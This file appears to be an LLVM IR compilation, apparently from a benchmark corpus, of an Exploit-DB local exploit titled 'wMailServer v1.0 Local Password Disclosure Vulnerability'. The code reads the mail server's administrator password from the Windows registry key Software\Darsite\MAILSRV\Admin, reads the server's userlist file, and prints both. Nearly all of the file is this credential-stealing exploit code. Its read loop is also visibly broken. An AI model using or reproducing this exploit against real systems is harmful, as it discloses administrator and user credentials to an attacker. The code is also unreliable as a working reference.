; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_25961.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_25961.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HKEY_CURRENT_CONFIG = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [31 x i8] c"Software\\Darsite\\MAILSRV\\Admin\00", align 1
@KEY_QUERY_VALUE = common dso_local global i32 0, align 4
@hKey = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [34 x i8] c"Aucune clef wMailServer en vue !\0A\00", align 1
@.str.2 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@pwd = common dso_local global i8* null, align 8
@dwBuf = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"Vide\0A\00", align 1
@.str.4 = private unnamed_addr constant [47 x i8] c"\0A\0A-------------------------------------------\0A\00", align 1
@.str.5 = private unnamed_addr constant [39 x i8] c"SoftiaCom Software - wMailServer v1.0\0A\00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"Local Password Disclosure Vulnerability\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [46 x i8] c"Discovered & coded by fRoGGz - SecuBox Labs\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [46 x i8] c"-------------------------------------------\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [34 x i8] c"Mot de passe Administrateur\09: %s\0A\00", align 1
@fichier = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [24 x i8] c"\\WINNT\\MAILSRV\\userlist\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"rb\00", align 1
@.str.12 = private unnamed_addr constant [12 x i8] c"Pas cool !\0A\00", align 1
@donnees = common dso_local global i8* null, align 8
@.str.13 = private unnamed_addr constant [38 x i8] c"\0AListe des comptes utilisateurs\0A\0A %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca [100 x i8], align 16
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @HKEY_CURRENT_CONFIG, align 4
  %6 = load i32, i32* @KEY_QUERY_VALUE, align 4
  %7 = call i64 @RegOpenKeyEx(i32 %5, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0), i32 0, i32 %6, i32* @hKey)
  %8 = load i64, i64* @ERROR_SUCCESS, align 8
  %9 = icmp ne i64 %7, %8
  br i1 %9, label %10, label %13

10:                                               ; preds = %0
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %63

13:                                               ; preds = %0
  %14 = load i32, i32* @hKey, align 4
  %15 = call i64 @RegQueryValueEx(i32 %14, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.2, i64 0, i64 0), i32* null, i32* null, i32* bitcast (i8** @pwd to i32*), i32* @dwBuf)
  %16 = load i64, i64* @ERROR_SUCCESS, align 8
  %17 = icmp ne i64 %15, %16
  br i1 %17, label %18, label %21

18:                                               ; preds = %13
  %19 = load i8*, i8** @pwd, align 8
  %20 = call i32 @lstrcpy(i8* %19, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  br label %21

21:                                               ; preds = %18, %13
  %22 = load i32, i32* @stdout, align 4
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %22, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0))
  %24 = load i32, i32* @stdout, align 4
  %25 = call i32 (i32, i8*, ...) @fprintf(i32 %24, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.5, i64 0, i64 0))
  %26 = load i32, i32* @stdout, align 4
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %26, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0))
  %28 = load i32, i32* @stdout, align 4
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.7, i64 0, i64 0))
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.8, i64 0, i64 0))
  %32 = load i32, i32* @stdout, align 4
  %33 = load i8*, i8** @pwd, align 8
  %34 = call i32 (i32, i8*, ...) @fprintf(i32 %32, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.9, i64 0, i64 0), i8* %33)
  %35 = load i8*, i8** @fichier, align 8
  %36 = call i32 @strcpy(i8* %35, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0))
  %37 = load i8*, i8** @fichier, align 8
  %38 = call i32* @fopen(i8* %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0))
  store i32* %38, i32** %3, align 8
  %39 = icmp eq i32* %38, null
  br i1 %39, label %40, label %42

40:                                               ; preds = %21
  %41 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %63

42:                                               ; preds = %21
  store i32 0, i32* %2, align 4
  br label %43

43:                                               ; preds = %57, %42
  %44 = load i32, i32* %2, align 4
  %45 = icmp slt i32 %44, 99
  br i1 %45, label %46, label %59

46:                                               ; preds = %43
  %47 = load i32*, i32** %3, align 8
  %48 = call signext i8 @getc(i32* %47)
  %49 = load i32, i32* %2, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [100 x i8], [100 x i8]* %4, i64 0, i64 %50
  store i8 %48, i8* %51, align 1
  %52 = load i8*, i8** @donnees, align 8
  %53 = getelementptr inbounds [100 x i8], [100 x i8]* %4, i64 0, i64 0
  %54 = call i32 @strcpy(i8* %52, i8* %53)
  %55 = load i32*, i32** %3, align 8
  %56 = call i32 @fclose(i32* %55)
  br label %57

57:                                               ; preds = %46
  %58 = load i32, i32* %2, align 4
  br label %43

59:                                               ; preds = %43
  %60 = load i32, i32* @stdout, align 4
  %61 = load i8*, i8** @donnees, align 8
  %62 = call i32 (i32, i8*, ...) @fprintf(i32 %60, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.13, i64 0, i64 0), i8* %61)
  store i32 0, i32* %1, align 4
  br label %63

63:                                               ; preds = %59, %40, %10
  %64 = load i32, i32* %1, align 4
  ret i32 %64
}

declare dso_local i64 @RegOpenKeyEx(i32, i8*, i32, i32, i32*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @RegQueryValueEx(i32, i8*, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @lstrcpy(i8*, i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local signext i8 @getc(i32*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
